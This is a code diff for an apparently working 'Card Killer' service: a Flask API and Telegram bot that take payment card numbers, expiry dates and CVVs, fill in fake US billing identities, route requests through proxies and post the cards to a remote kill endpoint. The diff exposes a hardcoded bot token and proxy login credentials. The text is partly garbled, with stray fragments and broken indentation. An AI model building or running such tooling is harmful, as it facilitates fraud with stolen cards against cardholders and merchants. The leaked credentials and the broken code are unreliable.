@@ -1,4 +1,41 @@
-/storage/emulated/0/OUTCOME/KILLERCODE/    {"first": "Linda", "last": "Harris", "address": "222 Dogwood Ln", "city": "Dallas", "state": "TX", "zip": "75201"},
+from flask import Flask, request, jsonify
+import requests
+import re
+import threading
+import random
+import time
+import logging
+import os
+from typing import Dict, List, Optional, Tuple
+
+app = Flask(__name__)
+
+# Render မှာ environment variable ကနေ ယူမယ်
+BOT_TOKEN = os.environ.get('BOT_TOKEN', '7556380686:AAHkY7xVjw4j14fcQy-5dlCGu5rcXha6vRU')
+TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+
+# Enhanced proxy list with more options
+PROXY_LIST = [
+    "gorkem.oynar@ogr.deu.edu.tr:Parola54@193.140.151.155:13128",
+    # Add more proxies here for better rotation
+]
+
+# Extended fake details pool with more diversity
+FAKE_DETAILS_POOL = [
+    {"first": "John", "last": "Smith", "address": "123 Oak St", "city": "Springfield", "state": "IL", "zip": "62704"},
+    {"first": "Emily", "last": "Jones", "address": "456 Maple Ave", "city": "Riverside", "state": "CA", "zip": "92501"},
+    {"first": "Michael", "last": "Williams", "address": "789 Pine Ln", "city": "Georgetown", "state": "TX", "zip": "78626"},
+    {"first": "Jessica", "last": "Brown", "address": "101 Elm Ct", "city": "Franklin", "state": "TN", "zip": "37064"},
+    {"first": "David", "last": "Davis", "address": "212 Birch Rd", "city": "Madison", "state": "WI", "zip": "53703"},
+    {"first": "Sarah", "last": "Miller", "address": "333 Cedar Blvd", "city": "Phoenix", "state": "AZ", "zip": "85001"},
+    {"first": "James", "last": "Wilson", "address": "444 Spruce Way", "city": "Denver", "state": "CO", "zip": "80202"},
+    {"first": "Jennifer", "last": "Moore", "address": "555 Redwood Dr", "city": "Portland", "state": "OR", "zip": "97201"},
+    {"first": "Robert", "last": "Taylor", "address": "666 Aspen Pl", "city": "Seattle", "state": "WA", "zip": "98101"},
+    {"first": "Mary", "last": "Anderson", "address": "777 Willow St", "city": "Boston", "state": "MA", "zip": "02108"},
+    {"first": "William", "last": "Thomas", "address": "888 Poplar Ave", "city": "Miami", "state": "FL", "zip": "33101"},
+    {"first": "Patricia", "last": "Jackson", "address": "999 Magnolia Ct", "city": "Atlanta", "state": "GA", "zip": "30303"},
+    {"first": "Richard", "last": "White", "address": "111 Sycamore Rd", "city": "Chicago", "state": "IL", "zip": "60601"},
+    {"first": "Linda", "last": "Harris", "address": "222 Dogwood Ln", "city": "Dallas", "state": "TX", "zip": "75201"},
     {"first": "Charles", "last": "Martin", "address": "321 Holly Blvd", "city": "Los Angeles", "state": "CA", "zip": "90001"},
 ]
 
@@ -168,11 +205,10 @@ def send_telegram_message(chat_id: int, message_id: int, text: str):
                 TELEGRAM_API_URL,
                 json={
                     'chat_id': chat_id,
-                    'message_id': message_id,
                     'text': text,
                     'parse_mode': 'HTML'
                 },
-                timeout=15  # Increased timeout
+                timeout=15
             )
             
             if response.status_code == 200:
@@ -329,66 +365,19 @@ def health_check():
         "timestamp": time.time()
     })
 
+@app.route('/', methods=['GET'])
+def home():
+    """Home endpoint"""
+    return jsonify({
+        "message": "Card Killer API is running!",
+        "version": "2.0",
+        "endpoints": {
+            "health": "/health",
+            "kill": "/kill (POST)"
+        }
+    })
+
 if __name__ == '__main__':
-    logger.info("Starting Card Killer v2 Server...")
-    app.run(host='0.0.0.0', port=10000, debug=False)    except IndexError:
-        bot.reply_to(message, "⚠️ Format: /kill CC|MM|YY|CVV")
-        return
-
-    match = re.match(r'(\d{16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})', command_text)
-    if not match:
-        bot.reply_to(message, "❌ Invalid format.")
-        return
-
-    full_cc = match.group(0)
-    payload = {'card': full_cc}
-
-    try:
-        response = requests.post("https://killbot-a7mt.onrender.com/kill", json=payload)
-        bot.reply_to(message, f"✅ Response:\n<code>{response.text}</code>", parse_mode='HTML')
-    except Exception as e:
-        bot.reply_to(message, f"🚫 Error: {e}")
-
-# --- Run Telegram bot in background ---
-def run_bot():
-    bot.polling(none_stop=True)
-
-threading.Thread(target=run_bot).start()
-    sent_message = bot.reply_to(message, f"<i>Kill initiated for <code>{masked}|{match.group(2)}|{match.group(3)}|{match.group(4)}</code>. Please wait...</i>", parse_mode='HTML')
-
-    payload = {
-        'chat_id': message.chat.id,
-        'message_id': sent_message.message_id,
-        'card': full_cc_string
-    }
-
-    headers = {
-        'Content-Type': 'application/json',
-        # add an authorization header if API expects it:
-        # 'Authorization': 'Bearer YOUR_API_KEY'
-    }
-
-    try:
-        resp = requests.post(API_URL, json=payload, headers=headers, timeout=20)
-    except requests.exceptions.RequestException as e:
-        logging.exception("Request to API failed")
-        bot.edit_message_text(f"<b>Error:</b> Could not contact API. <code>{e}</code>",
-                              chat_id=message.chat.id, message_id=sent_message.message_id, parse_mode='HTML')
-        return
-
-    # useful debug: include resp.text in logs (don't print sensitive data publicly)
-    logging.info("API status: %s body: %s", resp.status_code, resp.text[:1000])
-
-    if resp.status_code == 200:
-        bot.edit_message_text(f"<b>Done:</b> API accepted the task. Response: <code>{resp.text}</code>",
-                              chat_id=message.chat.id, message_id=sent_message.message_id, parse_mode='HTML')
-    elif resp.status_code == 405:
-        bot.edit_message_text("<b>Error:</b> API replied 405 Method Not Allowed. "
-                              "That means this endpoint doesn't accept the method you used (POST/GET mismatch).",
-                              chat_id=message.chat.id, message_id=sent_message.message_id, parse_mode='HTML')
-    else:
-        bot.edit_message_text(f"<b>Error:</b> API responded with status {resp.status_code}. Response body: <code>{resp.text}</code>",
-                              chat_id=message.chat.id, message_id=sent_message.message_id, parse_mode='HTML')
-
-if __name__ == "__main__":
-    bot.polling(none_stop=True)
+    port = int(os.environ.get('PORT', 10000))
+    logger.info(f"Starting Card Killer v2 Server on port {port}...")
+    app.run(host='0.0.0.0', port=port, debug=False)
